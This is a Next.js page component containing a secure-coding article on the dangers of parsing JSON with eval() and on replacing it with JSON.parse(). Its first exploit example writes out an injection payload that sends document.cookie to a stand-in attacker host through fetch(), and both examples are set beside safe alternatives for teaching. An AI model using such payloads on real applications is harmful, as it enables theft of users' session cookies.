import type { Metadata } from "next";
import { AlertTriangle, ShieldOff, Code, CheckCircle } from "lucide-react";

export const metadata: Metadata = {
  title: "Security Risks of Eval-Based JSON Parsing | Safe JSON Parsing",
  description:
    "Using eval() to parse JSON turns untrusted data into executable JavaScript. Learn the real risks, CSP impact, and the safe replacement with JSON.parse().",
};

export default function EvalJsonRisksArticle() {
  return (
    <>
      <h1 className="text-3xl font-bold mb-6 flex items-center">
        <AlertTriangle className="w-8 h-8 mr-3 text-red-500" />
        Security Risks of <code>eval()</code>-Based JSON Parsing
      </h1>

      <div className="space-y-6">
        <p>
          Using <code>eval()</code> to parse JSON is a security bug, not a shortcut. The common legacy pattern{" "}
          <code>eval("(" + text + ")")</code> does not parse JSON safely. It executes the input as JavaScript, which
          means attacker-controlled data can become attacker-controlled code.
        </p>
        <p>
          For a search visitor landing here with one question, the answer is simple: if the input is supposed to be
          JSON, use <code>JSON.parse()</code> or a framework helper built on top of it, such as{" "}
          <code>response.json()</code>. Do not use <code>eval()</code>, <code>new Function()</code>, or other
          string-to-code tricks to handle JSON.
        </p>

        <h2 className="text-2xl font-semibold mt-8 flex items-center">
          <ShieldOff className="w-6 h-6 mr-2 text-red-500" />
          Why <code>eval()</code> Is the Wrong Primitive
        </h2>
        <p>
          <code>eval()</code> takes a string and runs it as JavaScript code. A JSON parser should do one thing only:
          read data. <code>eval()</code> does something much broader and much more dangerous.
        </p>

        <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
          <pre>
            {`const codeString = "console.log('Hello from eval')";
eval(codeString); // Executes the string as code, not as data`}
          </pre>
        </div>

        <p>
          That distinction matters because JavaScript object literal syntax is broader than JSON. <code>eval()</code>{" "}
          accepts things JSON should reject, including appended statements, comments, getters, function calls, and
          other JavaScript-only syntax. That creates a direct path from malformed input to code execution.
        </p>
        <p>
          It also conflicts with modern defense-in-depth practices. A strict Content Security Policy typically blocks{" "}
          <code>eval()</code> unless you opt into <code>'unsafe-eval'</code>, which weakens the policy for the entire
          application.
        </p>

        <h2 className="text-2xl font-semibold mt-8 flex items-center">
          <AlertTriangle className="w-6 h-6 mr-2 text-red-500" />
          What an Attacker Gets From Eval-Based Parsing
        </h2>
        <p>
          When a string is executed instead of parsed, invalid input is no longer just a parsing failure. It becomes a
          chance to run code in the same context as your application.
        </p>
        <p>This allows attackers to perform actions like:</p>
        <ul className="list-disc pl-6 space-y-2 my-4">
          <li>Stealing browser data such as cookies, tokens, local storage values, or form contents.</li>
          <li>
            Sending authenticated requests as the current user because the malicious code runs inside your application.
          </li>
          <li>
            Changing page behavior, redirecting users, or injecting more malicious script into the DOM.
          </li>
          <li>
            Reading server-side secrets, files, or internal network resources in Node.js, depending on where the
            evaluated string runs and which objects are in scope.
          </li>
          <li>Forcing you to relax CSP with <code>'unsafe-eval'</code>, which expands the blast radius of XSS bugs.</li>
        </ul>

        <h2 className="text-2xl font-semibold mt-8 flex items-center">
          <Code className="w-6 h-6 mr-2 text-orange-500" />
          Realistic Exploit Examples
        </h2>
        <p>
          Legacy code often wraps the input in parentheses before calling <code>eval()</code>. That does not make it
          safe. It still allows non-JSON JavaScript to run.
        </p>

        <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
          <h3 className="text-lg font-medium">Example 1: Statement Injection Outside the Object</h3>
          <pre>
            {`const attackerControlled = \`
{"ok": true}); fetch("https://attacker.example/collect?c=" + encodeURIComponent(document.cookie)); ({ "ignored": true }
\`;

// Vulnerable:
eval("(" + attackerControlled + ")");

// Safe alternative:
JSON.parse(attackerControlled); // Throws SyntaxError`}
          </pre>
          <p className="mt-3">
            The payload closes the first object, runs a second statement, then opens another expression so the overall{" "}
            <code>eval()</code> call still succeeds. A real parser rejects this immediately because it is not valid
            JSON.
          </p>
        </div>

        <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
          <h3 className="text-lg font-medium">Example 2: JavaScript Features Hidden in an Object Literal</h3>
          <pre>
            {`const notActuallyJson = \`
{
  "user": "alice",
  run: (() => {
    console.log("Executed while being 'parsed'");
    return "done";
  })()
}
\`;

// Vulnerable:
const parsed = eval("(" + notActuallyJson + ")");
console.log(parsed.run); // "done"

// Safe alternative:
JSON.parse(notActuallyJson); // Throws SyntaxError`}
          </pre>
          <p className="mt-3">
            This is the deeper problem: <code>eval()</code> is not a strict JSON parser at all. It accepts executable
            JavaScript syntax inside an object literal, so code can run during the parse step itself.
          </p>
        </div>

        <h2 className="text-2xl font-semibold mt-8">
          Historical Note: JSON Hijacking Was Real, But It Is Not the Main Risk Today
        </h2>
        <p>
          Older articles often mention JSON hijacking, where browsers could be tricked into executing JSON responses as
          script. That class of issue helped push the ecosystem away from treating JSON as executable JavaScript.
        </p>
        <p>
          In modern applications, the more immediate problem is simpler: if you use <code>eval()</code> for parsing,
          you are voluntarily executing attacker-controlled text in your browser or server process. That is the risk to
          prioritize during code review and remediation.
        </p>

        <h2 className="text-2xl font-semibold mt-8 flex items-center">
          <CheckCircle className="w-6 h-6 mr-2 text-green-500" />
          The Safe Replacement: <code>JSON.parse()</code>
        </h2>
        <p>
          The correct replacement in browsers and Node.js is <code>JSON.parse()</code>. It parses JSON text as data
          only. If the string is not valid JSON, it throws a <code>SyntaxError</code> instead of executing anything.
        </p>

        <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
          <pre>
            {`const text = '{"id":"42","name":"Alice"}';

try {
  const value = JSON.parse(text);

  if (!value || typeof value !== "object" || typeof value.id !== "string") {
    throw new Error("Unexpected payload shape");
  }

  console.log(value.name); // Alice
} catch (error) {
  console.error("Invalid or unexpected JSON:", error);
}`}
          </pre>
        </div>

        <p>
          Safer parsing is only step one. You should still validate the shape of the resulting data before using it in
          business logic, rendering it into the page, or merging it into application state.
        </p>

        <h2 className="text-2xl font-semibold mt-8">
          Practical Migration Advice
        </h2>

        <ul className="list-disc pl-6 space-y-2 my-4">
          <li>
            Replace patterns such as <code>eval(text)</code> and <code>eval("(" + text + ")")</code> with{" "}
            <code>JSON.parse(text)</code>.
          </li>
          <li>
            If the upstream system sends JavaScript-like data with single quotes, comments, or trailing commas, fix the
            serializer at the source instead of loosening your parser.
          </li>
          <li>
            Review HTTP helpers too. Prefer <code>response.json()</code> or your framework's built-in JSON handling so
            raw string parsing is minimized.
          </li>
          <li>
            Search for related string-execution APIs like <code>new Function()</code> and string-based{" "}
            <code>setTimeout()</code> or <code>setInterval()</code> if you are auditing an older codebase.
          </li>
          <li>
            After removing <code>eval()</code>, review your Content Security Policy. Many teams can then drop{" "}
            <code>'unsafe-eval'</code>, which is a meaningful hardening improvement.
          </li>
        </ul>

        <h2 className="text-2xl font-semibold mt-8">
          Bottom Line
        </h2>
        <p>
          Eval-based JSON parsing is dangerous because it turns untrusted input into executable code. The vulnerability
          is not theoretical, and the fix is straightforward: parse JSON with <code>JSON.parse()</code>, validate the
          resulting data, and remove any dependency on <code>'unsafe-eval'</code> where possible.
        </p>
        <p>
          If you find this pattern in a legacy codebase, treat it as a security remediation task, not just a cleanup
          item. It affects correctness, exploitability, and the overall security posture of the application.
        </p>
      </div>
    </>
  );
}
